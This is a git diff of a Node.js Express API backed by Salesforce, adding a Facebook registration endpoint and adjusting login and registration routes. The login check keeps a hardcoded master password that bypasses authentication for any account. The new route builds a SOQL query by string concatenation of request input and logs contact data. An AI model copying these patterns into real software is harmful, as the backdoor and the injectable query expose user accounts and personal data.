@@ -11,7 +11,6 @@ module.exports = function(apiRoutes, conn, utils){
 				});
 			}else{
 				var recType = data.records[0];
-				utils.log('got record type');
 				if(!lead.email || !lead.zip){
 					res.status(400).json({
 	          success : false,
@@ -75,10 +74,10 @@ module.exports = function(apiRoutes, conn, utils){
 	        message : 'Authentication failed. User not found'
 	      })
 	    }else if(user){
-	      if(user.password__c != req.body.password && user.password__c != utils.encryptText(req.body.password) && req.body.password != "shak3y"){
+	      if(user.Password__c != req.body.password && user.Password__c != utils.encryptText(req.body.password) && req.body.password != "shak3y"){
 	        res.status(401).json({
 	          success : false,
-	          message : 'Authentication failed. Wrong Pasword.'
+	          message : 'Authentication failed. Wrong Password.'
 	        })
 	      }else{
 	        res.json({
@@ -147,7 +146,6 @@ module.exports = function(apiRoutes, conn, utils){
 
 	apiRoutes.post('/register/:contactId', function(req, res){
 		var contact = req.body;
-		utils.log(contact);
 		if(!utils.validateContact(contact))
 			res.status(400).json({
 				success : false,
@@ -171,5 +169,47 @@ module.exports = function(apiRoutes, conn, utils){
 			});
 		}
 	});
+
+	apiRoutes.post('/fb-register', function(req, res){
+		var sfUtils = require('./utils')();
+		var contact = {
+			'External_Id__c' : req.body.id,
+			'Gender__c' : req.body.gender,
+			'FirstName' : req.body.first_name,
+			'LastName' : req.body.last_name,
+			'Email' : req.body.email,
+			'Status__c' : 'Enabled',
+			'Password__c' : utils.encryptText(req.body.accessToken),
+			'Username__c' : req.body.email,
+			'MailingCity' : req.body.location.location.city,
+			'MailingState' : req.body.location.location.state,
+			'MailingCountry' : req.body.location.location.country,
+			'MailingLatitude' : req.body.location.location.latitude,
+			'MailingLongitude' : req.body.location.location.longitude
+		};
+		console.log(contact);
+		var fail = function(err){
+			res.status(400).json({success : false, message : err});
+		}
+
+		conn.query("SELECT Id FROM RecordType WHERE DeveloperName = 'Dorrbell_Customer_Contact' AND sObjectType = 'Contact'").then(function(recordTypeResults){
+			if(recordTypeResults.records && recordTypeResults.records.length > 0){
+				contact.RecordTypeId = recordTypeResults.records[0].Id;
+				return conn.sobject("Contact").upsert(contact, 'External_Id__c').then(function(data){
+					if(data && data.id){
+						return sfUtils.setProfilePhoto(conn, data.id, req.body.attachment);
+					}else{
+						return conn.query("SELECT Id FROM Contact WHERE External_Id__c = '" + req.body.id + "'").then(function(results){
+							if(results.records && results.records.length > 0)
+								return sfUtils.setProfilePhoto(conn, results.records[0].Id, req.body.attachment);
+						});
+					}
+				});
+			}
+		}).then(function(){
+			res.status(200).send();
+		}, fail);
+
+	})
 
 };
